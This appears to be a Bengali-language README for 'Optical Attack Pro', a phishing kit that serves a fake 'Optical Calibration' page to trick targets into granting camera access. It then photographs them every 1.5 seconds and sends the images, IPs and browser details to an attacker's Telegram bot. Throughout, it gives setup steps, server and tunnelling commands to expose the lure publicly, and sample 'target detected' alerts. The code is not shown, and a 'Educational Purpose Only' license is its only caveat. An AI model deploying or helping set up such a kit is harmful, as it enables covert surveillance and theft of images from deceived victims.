# Optical Attack Pro v1.0
**Made by Ahsan**

## লোকাল সার্ভার + Telegram ইমেজ এক্সফিল ফ্রেমওয়ার্ক

---

## ফোল্ডার স্ট্রাকচার

```
Optical-Attack-Pro/
├── index.html              # এন্ট্রি পয়েন্ট
├── calibration.html        # অপটিক্যাল ক্যালিব্রেশন লুর
├── ip.php                  # IP হার্ভেস্টার + Telegram নোটিফাই
├── telegram_send.php       # ইমেজ এক্সফিল (Telegram)
├── setup.sh                # প্রথম সেটআপ
├── start.sh                # সার্ভার স্টার্ট
├── README.md               # ডকুমেন্টেশন
├── QUICK_START.txt         # দ্রুত শুরু গাইড
├── optical_captures/       # স্থানীয় ব্যাকআপ (স্বয়ংক্রিয়)
└── optical_logs/           # কার্যকলাপ লগ (স্বয়ংক্রিয়)
```

---

## বিশেষত্ব

✅ **লোকাল সার্ভার শুধু**
- Ngrok বা কোনো cloud সার্ভিস নেই
- শুধু localhost:3333
- তোমার নেটওয়ার্কে শুধুমাত্র কাজ করে

✅ **Telegram ডাইরেক্ট**
- ছবি সরাসরি Telegram বটে যায়
- বিনা গেলায় দ্রুত
- সব ডেটা এনক্রিপ্টেড থাকে (Telegram HTTPS)

✅ **স্থানীয় ব্যাকআপ**
- optical_captures/ এ সব ছবি সংরক্ষিত
- optical_logs/ এ কার্যকলাপ লগ

✅ **Ahsan Edition**
- সব ফাইলে ক্রেডিট থাকে
- পেশাদার ইন্টারফেস
- সম্পূর্ণ কাস্টমাইজড

---

## ইনস্টলেশন

### ধাপ ১: ফোল্ডার খুলো
```bash
cd Optical-Attack-Pro
```

### ধাপ ২: Telegram বট তৈরি করো

1. Telegram খুলো → `@BotFather` সার্চ করো
2. `/newbot` পাঠাও
3. নাম: `OpticalAttackBot`
4. ইউজারনেম: `optical_attack_bot`
5. **TOKEN কপি করো**

### ধাপ ৩: Chat ID নাও

1. বটকে মেসেজ পাঠাও
2. ব্রাউজারে খুলো:
```
https://api.telegram.org/botYOUR_TOKEN/getUpdates
```
3. `chat` → `id` কপি করো

### ধাপ ৪: সেটআপ করো
```bash
bash setup.sh
```

যখন প্রশ্ন আসে:
- TOKEN পেস্ট করো
- Chat ID পেস্ট করো
- এন্টার দাও

### ধাপ ৫: সার্ভার চালু করো
```bash
bash start.sh
```

**সার্ভার চলবে:** `http://localhost:3333`

---

## কাজের ধাপ

1. **লিংক শেয়ার করো**
   ```
   http://localhost:3333
   (একই নেটওয়ার্কে)
   ```

2. **টার্গেট লিংক খুলে**
   - "Optical Calibration" দেখে
   - ক্যামেরা অনুমতি চাওয়া হয়

3. **অনুমতি দিলে**
   - প্রতি ১.৫ সেকেন্ডে ছবি তোলা শুরু
   - Telegram-এ তাৎক্ষণিক যায়

4. **ডেটা পাও**
   - Telegram চ্যাটে: প্রতিটি ছবি + মেটাডেটা
   - optical_captures/: স্থানীয় ব্যাকআপ

---

## ক্লাউড ডেপ্লয়মেন্ট

**Ngrok নেই। তুমি ব্যবহার করবে:**

### অপশন A: Cloudflare Tunnel
```bash
cloudflared tunnel --url http://localhost:3333
```

### অপশন B: Frp
```bash
# frps সার্ভারে চালাও
# frpc দিয়ে localhost:3333 টানেল করো
```

### অপশন C: Custom Proxy
- নিজের ভিপিএস ব্যবহার করো
- SSH টানেল করো
- কাস্টম সলিউশন

**Optical Attack Pro শুধু local server বিল্ড করে। বাকি তোমার দায়িত্ব।**

---

## ডেটা দেখা

### Telegram-এ:

**প্রথম নোটিফাই:**
```
🎯 OPTICAL ATTACK INITIATED

📍 Target Detected
🔹 IP: 192.168.1.50
🔹 Browser: Mozilla/5.0...
🔹 Time: 2025-09-14 14:30:45
🔹 Status: ⏳ Awaiting optical access...

Optical Attack Pro v1.0
Made by Ahsan
```

**প্রতিটি ছবি:**
```
📸 OPTICAL CAPTURE

🎯 Target Data
🔹 IP: 192.168.1.50
🔹 Time: 2025-09-14 14:30:47
🔹 Status: ✅ ACTIVE

Optical Attack Pro v1.0
Made by Ahsan
```

### স্থানীয়ভাবে:
```bash
# ছবি দেখুন
ls -la optical_captures/

# লগ দেখুন
cat optical_logs/exfil.log

# টার্গেট রেকর্ড
cat targets.txt
```

---

## ফাইল বর্ণনা

| ফাইল | কাজ |
|------|-----|
| `index.html` | ল্যান্ডিং → calibration.html রিডিরেক্ট |
| `calibration.html` | অপটিক্যাল ক্যালিব্রেশন লুর + JS ক্যাপচার |
| `ip.php` | IP/UA লগ + Telegram নোটিফাই |
| `telegram_send.php` | ইমেজ ডিকোড → Telegram এক্সফিল |
| `setup.sh` | TOKEN কনফিগারেশন |
| `start.sh` | PHP সার্ভার চালু করে |

---

## সেটিংস চেঞ্জ করা

যদি Telegram তথ্য পরিবর্তন করতে হয়:

**ip.php:**
```php
define('TELEGRAM_BOT_TOKEN', 'NEW_TOKEN');
define('TELEGRAM_CHAT_ID', 'NEW_CHAT_ID');
```

**telegram_send.php:**
একই জায়গায় আপডেট করো।

---

## ট্রাবলশুট

**Q: Setup.sh কাজ করছে না?**
```bash
chmod +x setup.sh start.sh
bash setup.sh
```

**Q: Telegram মেসেজ পাচ্ছি না?**
- TOKEN সঠিক? (setup.sh এ enter দেওয়ার সময়)
- Chat ID সঠিক? (getUpdates API থেকে)
- ইন্টারনেট আছে?

**Q: ছবি পাচ্ছি না optical_captures/ এ?**
```bash
chmod 755 optical_captures/
ls -la optical_captures/
```

**Q: পোর্ট 3333 ব্যবহারে আছে?**
```bash
lsof -i :3333
kill -9 [PID]
```

---

## নোট

- ✅ লোকাল সার্ভার শুধু
- ✅ একই Wi-Fi বা একই কম্পিউটারে কাজ করে
- ✅ ক্লাউড কানেক্ট করতে তুমি দায়ী
- ✅ Telegram বট 24/7 কাজ করে
- ✅ সব ক্রেডিট: Ahsan

---

## সংস্করণ

**Optical Attack Pro v1.0**
- ✅ Local PHP server
- ✅ Telegram real-time exfil
- ✅ Optical Calibration lure
- ✅ Full Bengali documentation
- ✅ Made by Ahsan

---

## লাইসেন্স

Educational Purpose Only

---

**Created by:** Ahsan  
**Framework:** Optical Attack Pro v1.0  
**Last Updated:** 2025-09-14
